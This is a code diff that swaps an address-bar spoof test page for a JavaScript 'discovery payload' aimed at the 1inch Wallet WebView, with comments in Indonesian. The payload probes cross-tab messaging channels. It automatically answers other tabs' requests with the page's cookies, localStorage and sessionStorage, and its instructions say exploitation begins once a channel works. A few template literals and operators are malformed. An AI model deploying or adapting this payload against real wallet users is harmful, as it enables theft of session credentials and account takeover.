@@ -1,35 +1,494 @@
+<!-- 1inch Multi-Tab Discovery Payload -->
+<!-- Host ini di server Anda, buka di Tab A 1inch Wallet WebView -->
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Click Spoof Testcase By Code Audit Labs of VulnHunt.com</title>
+    <title>1inch Multi-Tab Discovery</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0e17;
+            color: #00ff88;
+            padding: 20px;
+            margin: 0;
+        }
+        .container { max-width: 700px; margin: 0 auto; }
+        h1 { color: #00ff88; font-size: 18px; border-bottom: 1px solid #00ff88; padding-bottom: 8px; }
+        .section { margin: 15px 0; padding: 12px; background: #111927; border: 1px solid #1a2a3a; border-radius: 6px; }
+        .section-title { font-size: 13px; color: #4a9eff; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px; }
+        .status { font-size: 13px; margin: 4px 0; padding: 4px 8px; border-left: 3px solid #333; }
+        .status.ready { border-left-color: #00ff88; color: #00ff88; }
+        .status.fail { border-left-color: #ff4444; color: #ff4444; }
+        .status.info { border-left-color: #ffaa00; color: #ffaa00; }
+        .status.data { border-left-color: #4a9eff; color: #4a9eff; }
+        .log-area {
+            background: #050a12;
+            padding: 10px;
+            border-radius: 4px;
+            height: 200px;
+            overflow-y: auto;
+            font-size: 12px;
+            line-height: 1.6;
+            margin-top: 10px;
+        }
+        .log-area div { border-bottom: 1px solid #0d1520; padding: 2px 0; }
+        .timestamp { color: #666; margin-right: 8px; }
+        .badge {
+            display: inline-block;
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 6px;
+        }
+        .badge.ok { background: #00ff8822; color: #00ff88; border: 1px solid #00ff88; }
+        .badge.fail { background: #ff444422; color: #ff4444; border: 1px solid #ff4444; }
+        .badge.na { background: #66666622; color: #666; border: 1px solid #333; }
+        button {
+            background: #00ff88;
+            color: #0a0e17;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-right: 8px;
+            margin-top: 8px;
+            font-family: 'Courier New', monospace;
+        }
+        button:hover { background: #00cc6a; }
+        button.secondary { background: #1a2a3a; color: #4a9eff; }
+        button.secondary:hover { background: #2a3a4a; }
+        input[type="text"] {
+            background: #0a0e17;
+            border: 1px solid #1a2a3a;
+            color: #00ff88;
+            padding: 8px;
+            border-radius: 4px;
+            width: 100%;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+        .payload-box {
+            background: #050a12;
+            border: 1px dashed #4a9eff;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 10px 0;
+            color: #4a9eff;
+        }
+        #cookieList { font-size: 12px; margin-top: 8px; }
+        .cookie-item { padding: 3px 0; border-bottom: 1px solid #0d1520; display: flex; justify-content: space-between; }
+        .cookie-name { color: #ffaa00; }
+        .cookie-value { color: #4a9eff; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    </style>
 </head>
 <body>
+<div class="container">
+    <h1>🔍 1inch Multi-Tab Discovery v1.0</h1>
+    <p style="font-size: 12px; color: #666;">
+        Tab ID: <span id="tabId">---</span> &nbsp;|&nbsp; 
+        Origin: <span id="displayOrigin">---</span> &nbsp;|&nbsp;
+        User Agent: <span id="userAgent">---</span>
+    </p>
 
-  <h3>
-    <a href="http://www.google.com" id="a" onclick="executeSpoof(event)">click here Address Bar</a>
-  </h3>
-  
-  <h3 id="note" style="display:none;">
-    <img src="https://i.ibb.co.com/xS0bMW7S/image.png" alt="Obito Scene" style="max-width: 500px; height: auto;">
-    <br>
-    I Am Not Google At All
-  </h3>
+    <!-- Channel Status -->
+    <div class="section">
+        <div class="section-title">📡 Communication Channels</div>
+        <div class="status" id="bcStatus">▸ BroadcastChannel: <span>checking...</span></div>
+     <div class="status" id="storageStatus">▸ StorageEvent (localStorage): <span>checking...</span></div>
+        <div class="status" id="windowRefStatus">▸ window.open reference: <span>checking...</span></div>
+        <div class="status" id="postMessageStatus">▸ window.postMessage: <span>checking...</span></div>
+        <div class="status" id="rnwStatus">▸ ReactNativeWebView bridge: <span>checking...</span></div>
+        <div class="status" id="workerStatus">▸ SharedWorker: <span>checking...</span></div>
+    </div>
 
-</body>
+    <!-- Controls -->
+    <div class="section">
+        <div class="section-title">🎮 Controls</div>
+        <button onclick="sendPing()">📤 SEND PING (all channels)</button>
+        <button onclick="requestCookie()" class="secondary">🍪 REQUEST COOKIE</button>
+        <button onclick="scanSession()" class="secondary">🔑 SCAN SESSION</button>
+        <br><br>
+        <div style="font-size: 12px; color: #666;">Custom message:</div>
+        <div style="display: flex; gap: 8px; margin-top: 4px;">
+            <input type="text" id="customMsg" placeholder="Type message here..." style="flex: 1;">
+            <button onclick="sendCustom()" class="secondary" style="white-space: nowrap;">SEND</button>
+        </div>
+    </div>
+
+    <!-- Received Data -->
+    <div class="section">
+        <div class="section-title">📥 Received Data dari Tab Lain</div>
+        <div id="receivedData">
+            <div style="color: #666; font-size: 12px;">Belum ada data diterima. Buka halaman ini di Tab B untuk test komunikasi.</div>
+        </div>
+    </div>
+
+    <!-- Log -->
+    <div class="section">
+        <div class="section-title">📋 Activity Log</div>
+        <div class="log-area" id="logArea">
+            <div><span class="timestamp">[*]</span> Discovery payload loaded.</div>
+        </div>
+    </div>
+
+    <!-- Tab Info -->
+    <div class="section" style="border-color: #ffaa00;">
+        <div class="section-title">ℹ️ Bagaimana cara test</div>
+        <ol style="font-size: 12px; color: #aaa; margin: 0; padding-left: 20px;">
+            <li>Buka halaman ini di <strong>Tab A</strong> 1inch Wallet WebView</li>
+            <li>Buka halaman ini lagi di <strong>Tab B</strong> (new tab)</li>
+            <li>Klik "SEND PING" di Tab A → cek apakah Tab B menerima</li>
+            <li>Klik "SEND PING" di Tab B → cek apakah Tab A menerima</li>
+            <li>Jika salah satu channel bekerja, exploitation bisa dimulai</li>
+        </ol>
+    </div>
+</div>
 
 <script>
-  function executeSpoof(event) {
-    
-    event.preventDefault();
+// ===== CONFIGURATION =====
+const DISCOVERY_KEY = '1inch_mt_discovery';
+const PING_CHANNEL = '1inch_mt_ping';
+const COOKIE_CHANNEL = '1inch_mt_cookie';
+const SESSION_CHANNEL = '1inch_mt_session';
 
-   
-    try { stop(); } catch(e) {} 
-    
-   
-    document.title = 'Done';
-    document.getElementById('a').style.display = 'none';
-    document.getElementById('note').style.display = 'block';
+// Generate unique Tab ID
+const TAB_ID = 'tab_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+document.getElementById('tabId').textContent = TAB_ID;
+document.getElementById('displayOrigin').textContent = window.origin || 'null';
+document.getElementById('userAgent').textContent = navigator.userAgent.substring(0, 80) + '...';
 
-  }
+// ===== LOGGING =====
+function log(msg, type = 'info') {
+    const logArea = document.getElementById('logArea');
+    const ts = new Date().toLocaleTimeString();
+    const prefix = type === 'sent' ? '→' : type === 'received' ? '←' : '*';
+    logArea.innerHTML += <div><span class="timestamp">[${ts}]</span> ${prefix} ${msg}</div>;
+    logArea.scrollTop = logArea.scrollHeight;
+}
+
+function displayReceived(data, channel) {
+    const div = document.getElementById('receivedData');
+    const item = document.createElement('div');
+    item.style.cssText = 'padding: 6px; margin: 4px 0; background: #0d1520; border-radius: 4px; font-size: 12px; border-left: 3px solid #4a9eff;';
+    item.innerHTML = <span style="color: #4a9eff;">[${channel}]</span> <span style="color: #aaa;">${JSON.stringify(data)}</span>;
+    div.prepend(item);
+}
+
+// ===== CHANNEL 1: BroadcastChannel API =====
+let bc = null;
+try {
+    bc = new BroadcastChannel(PING_CHANNEL);
+    bc.onmessage = function(e) {
+        log('BC received: ' + JSON.stringify(e.data), 'received');
+      displayReceived(e.data, 'BroadcastChannel');
+        handleIncoming(e.data);
+    };
+    document.querySelector('#bcStatus span').innerHTML = '<span class="badge ok">✅ READY</span>';
+    log('BroadcastChannel: OK');
+} catch(e) {
+    document.querySelector('#bcStatus span').innerHTML = '<span class="badge fail">❌ UNAVAILABLE</span>';
+    log('BroadcastChannel: FAIL - ' + e.message);
+}
+
+function broadcastSend(data) {
+    if (bc) {
+        bc.postMessage({from: TAB_ID, data: data, ts: Date.now()});
+        log('BC sent: ' + JSON.stringify(data), 'sent');
+    }
+}
+
+// ===== CHANNEL 2: StorageEvent (localStorage) =====
+// Listen for storage events
+window.addEventListener('storage', function(e) {
+    if (e.key && e.key.startsWith(DISCOVERY_KEY)) {
+        try {
+            const payload = JSON.parse(e.newValue);
+            if (payload && payload.from !== TAB_ID) {
+                log('StorageEvent received: ' + JSON.stringify(payload.data), 'received');
+                displayReceived(payload.data, 'StorageEvent');
+                handleIncoming(payload.data);
+            }
+        } catch(ex) {
+            log('StorageEvent parse error: ' + ex.message);
+        }
+    }
+});
+
+document.querySelector('#storageStatus span').innerHTML = '<span class="badge ok">✅ LISTENING</span>';
+
+function storageSend(data) {
+    const payload = JSON.stringify({from: TAB_ID, data: data, ts: Date.now()});
+    localStorage.setItem(DISCOVERY_KEY + '_' + Date.now(), payload);
+    // Cleanup old entries
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key && key.startsWith(DISCOVERY_KEY + '_')) {
+            const age = Date.now() - (JSON.parse(localStorage.getItem(key)  '{}').ts  0);
+            if (age > 30000) localStorage.removeItem(key);
+        }
+    }
+    log('StorageEvent sent: ' + JSON.stringify(data), 'sent');
+}
+
+// ===== CHANNEL 3: window.open references =====
+let openedWindows = [];
+let openerRef = null;
+
+// Try to communicate via window.opener
+if (window.opener && window.opener !== window) {
+    openerRef = window.opener;
+    document.querySelector('#windowRefStatus span').innerHTML = '<span class="badge ok">✅ opener AVAILABLE</span>';
+    log('window.opener available');
+} else {
+    document.querySelector('#windowRefStatus span').innerHTML = '<span class="badge na">⏸️ opener not available (this is first tab)</span>';
+}
+
+function windowRefSend(data) {
+    // Send to all windows we've opened
+    openedWindows.forEach((w, idx) => {
+        try {
+            if (w && !w.closed) {
+                w.postMessage({from: TAB_ID, channel: PING_CHANNEL, data: data, ts: Date.now()}, '*');
+                log('windowRef[' + idx + '] sent: ' + JSON.stringify(data), 'sent');
+            }
+        } catch(e) {
+            log('windowRef[' + idx + '] send error: ' + e.message);
+        }
+    });
+
+    // Send via opener
+    try {
+        if (openerRef && !openerRef.closed) {
+            openerRef.postMessage({from: TAB_ID, channel: PING_CHANNEL, data: data, ts: Date.now()}, '*');
+            log('window.opener sent: ' + JSON.stringify(data), 'sent');
+        }
+    } catch(e) {
+        log('window.opener send error: ' + e.message);
+    }
+}
+
+// ===== CHANNEL 4: window.postMessage =====
+window.addEventListener('message', function(e) {
+    // Log all incoming messages regardless of origin
+    log('postMessage from ' + e.origin + ': ' + JSON.stringify(e.data), 'received');
+    
+    // Check if it's our protocol
+    if (e.data && e.data.channel === PING_CHANNEL && e.data.from !== TAB_ID) {
+        displayReceived(e.data, 'postMessage');
+        handleIncoming(e.data.data);
+    }
+});
+
+document.querySelector('#postMessageStatus span').innerHTML = '<span class="badge ok">✅ LISTENING (origin: *)</span>';
+
+function postMessageSend(data) {
+    // Broadcast to all possible origins
+    const targets = ['*', window.location.origin];
+    targets.forEach(origin => {
+        try {
+            window.postMessage({from: TAB_ID, channel: PING_CHANNEL, data: data, ts: Date.now()}, origin);
+        } catch(e) {}
+      });
+    log('postMessage broadcast sent: ' + JSON.stringify(data), 'sent');
+}
+
+// ===== CHANNEL 5: ReactNativeWebView bridge =====
+const RNW = window.ReactNativeWebView || window.ReactNativeWebView?.postMessage;
+if (typeof RNW !== 'undefined' && RNW !== null) {
+    document.querySelector('#rnwStatus span').innerHTML = '<span class="badge ok">✅ ReactNativeWebView DETECTED</span>';
+    log('ReactNativeWebView bridge AVAILABLE');
+    
+    // Try to use it as a relay
+    if (typeof RNW === 'function') {
+        // postMessage via RN bridge might allow inter-tab if app relays
+        log('ReactNativeWebView.postMessage() is a function - potential relay channel');
+    }
+} else {
+    document.querySelector('#rnwStatus span').innerHTML = '<span class="badge na">⏸️ Not detected</span>';
+    log('ReactNativeWebView: not detected');
+}
+
+// ===== CHANNEL 6: SharedWorker =====
+try {
+    // SharedWorker typically fails silently in WebView
+    var sw = new SharedWorker('data:text/javascript,' + encodeURIComponent('onconnect=function(e){e.ports[0].postMessage("pong");e.ports[0].onmessage=function(e){e.ports[0].postMessage("echo:"+e.data);}}'));
+    sw.port.onmessage = function(e) {
+        log('SharedWorker: ' + e.data);
+        document.querySelector('#workerStatus span').innerHTML = '<span class="badge ok">✅ SharedWorker WORKS!</span>';
+    };
+    sw.port.postMessage('ping');
+    setTimeout(() => {
+        if (document.querySelector('#workerStatus span').textContent.includes('checking')) {
+            document.querySelector('#workerStatus span').innerHTML = '<span class="badge fail">❌ SharedWorker FAILED (timeout)</span>';
+        }
+    }, 2000);
+} catch(e) {
+    document.querySelector('#workerStatus span').innerHTML = '<span class="badge fail">❌ SharedWorker: ' + e.message + '</span>';
+    log('SharedWorker: FAIL - ' + e.message);
+}
+
+// ===== MESSAGE HANDLER =====
+function handleIncoming(data) {
+    if (typeof data === 'object') {
+        if (data.type === 'ping') {
+            log('🔔 PING dari tab ' + (data.from || 'unknown'));
+        } else if (data.type === 'pong') {
+            log('🔔 PONG dari tab ' + (data.from || 'unknown'));
+        } else if (data.type === 'cookie_response') {
+            log('🍪 COOKIE RECEIVED: ' + JSON.stringify(data.payload), 'received');
+            renderCookieData(data.payload);
+        } else if (data.type === 'session_response') {
+            log('🔑 SESSION DATA RECEIVED', 'received');
+            renderSessionData(data.payload);
+        }
+    }
+}
+
+// ===== SEND FUNCTIONS =====
+function sendPing() {
+    const payload = {type: 'ping', from: TAB_ID, msg: 'Hello from ' + TAB_ID};
+    broadcastSend(payload);
+    storageSend(payload);
+    windowRefSend(payload);
+    postMessageSend(payload);
+    log('📤 PING sent via ALL channels');
+}
+
+function requestCookie() {
+    const payload = {type: 'cookie_request', from: TAB_ID, target: document.location.hostname};
+    broadcastSend(payload);
+    storageSend(payload);
+    windowRefSend(payload);
+    postMessageSend(payload);
+    log('🍪 Cookie request sent');
+}
+
+function scanSession() {
+    const payload = {type: 'session_request', from: TAB_ID};
+    broadcastSend(payload);
+    storageSend(payload);
+    windowRefSend(payload);
+    postMessageSend(payload);
+    log('🔑 Session scan request sent');
+}
+
+function sendCustom() {
+    const msg = document.getElementById('customMsg').value;
+    if (!msg) return;
+    const payload = {type: 'custom', from: TAB_ID, msg: msg};
+    broadcastSend(payload);
+    storageSend(payload);
+    windowRefSend(payload);
+    postMessageSend(payload);
+    log('📤 Custom sent: ' + msg);
+    document.getElementById('customMsg').value = '';
+}
+
+// ===== RECEIVE & RENDER =====
+function renderCookieData(cookies) {
+    const div = document.getElementById('cookieList') || (function(){
+        const d = document.createElement('div');
+        d.id = 'cookieList';
+        document.querySelector('.section:last-child').appendChild(d);
+        return d;
+    })();
+    div.
+      innerHTML = '<div style="color:#ffaa00;margin-bottom:8px;">🍪 Cookies diterima:</div>';
+    if (Array.isArray(cookies) && cookies.length > 0) {
+        cookies.forEach(c => {
+            div.innerHTML += <div class="cookie-item"><span class="cookie-name">${c.name}</span><span class="cookie-value">${c.value.substring(0, 30)}${c.value.length > 30 ? '...' : ''}</span></div>;
+        });
+    } else {
+        div.innerHTML += '<div style="color:#666;">No cookies found</div>';
+    }
+}
+
+function renderSessionData(data) {
+    const div = document.getElementById('receivedData');
+    div.prepend(`<div style="padding:8px;margin:4px 0;background:#0d1520;border-left:3px solid #ffaa00;font-size:12px;">
+        <span style="color:#ffaa00;">🔑 SESSION DATA</span><br>
+        <span style="color:#aaa;">${JSON.stringify(data, null, 2).substring(0, 500)}</span>
+    </div>`);
+}
+
+// ===== AUTO-RESPOND TO REQUESTS =====
+// This makes the payload automatically respond to requests from other tabs
+window.addEventListener('storage', function(e) {
+    if (e.key && e.key.startsWith(DISCOVERY_KEY)) {
+        try {
+            const payload = JSON.parse(e.newValue);
+            if (payload.from !== TAB_ID) {
+                if (payload.data && payload.data.type === 'cookie_request') {
+                    autoSendCookies(payload.from);
+                } else if (payload.data && payload.data.type === 'session_request') {
+                    autoSendSession(payload.from);
+                }
+            }
+        } catch(ex) {}
+    }
+});
+
+// Also auto-respond to postMessage requests
+window.addEventListener('message', function(e) {
+    if (e.data && e.data.channel === PING_CHANNEL && e.data.from !== TAB_ID) {
+        if (e.data.data && e.data.data.type === 'cookie_request') {
+            autoSendCookies(e.data.from);
+        } else if (e.data.data && e.data.data.type === 'session_request') {
+            autoSendSession(e.data.from);
+        } else if (e.data.data && e.data.data.type === 'ping') {
+            // Auto pong
+            const pong = {type: 'pong', from: TAB_ID, msg: 'Pong from ' + TAB_ID};
+            storageSend(pong);
+            postMessageSend(pong);
+        }
+    }
+});
+
+function autoSendCookies(targetTab) {
+    try {
+        const cookies = document.cookie.split(';').map(c => {
+            const parts = c.trim().split('=');
+            return {name: parts[0], value: parts.slice(1).join('=')};
+        }).filter(c => c.name);
+        
+        const response = {type: 'cookie_response', from: TAB_ID, target: targetTab, payload: cookies};
+        const ts = Date.now();
+        localStorage.setItem(DISCOVERY_KEY + '_resp_' + ts, JSON.stringify({from: TAB_ID, data: response, ts: ts}));
+        postMessageSend(response);
+        log('🍪 Auto-sent ' + cookies.length + ' cookies as response');
+    } catch(e) {
+        log('🍪 Auto-send cookie error: ' + e.message);
+    }
+}
+
+function autoSendSession(targetTab) {
+    try {
+        const sessionData = {
+            cookies: document.cookie,
+            localStorage: {...localStorage},
+            sessionStorage: {...sessionStorage},
+            userAgent: navigator.userAgent,
+            origin: window.origin,
+            href: window.location.href
+        };
+        
+        const response = {type: 'session_response', from: TAB_ID, target: targetTab, payload: sessionData};
+        const ts = Date.now();
+        localStorage.setItem(DISCOVERY_KEY + '_sess_' + ts, JSON.stringify({from: TAB_ID, data: response, ts: ts}));
+        postMessageSend(response);
+        log('🔑 Auto-sent session data as response');
+    } catch(e) {
+        log('🔑 Auto-send session error: ' + e.message);
+    }
+}
+
+log('✅ Discovery payload siap. Tab ID: ' + TAB_ID);
+log('📡 Menunggu tab lain untuk test komunikasi...');
 </script>
+</body>
 </html>
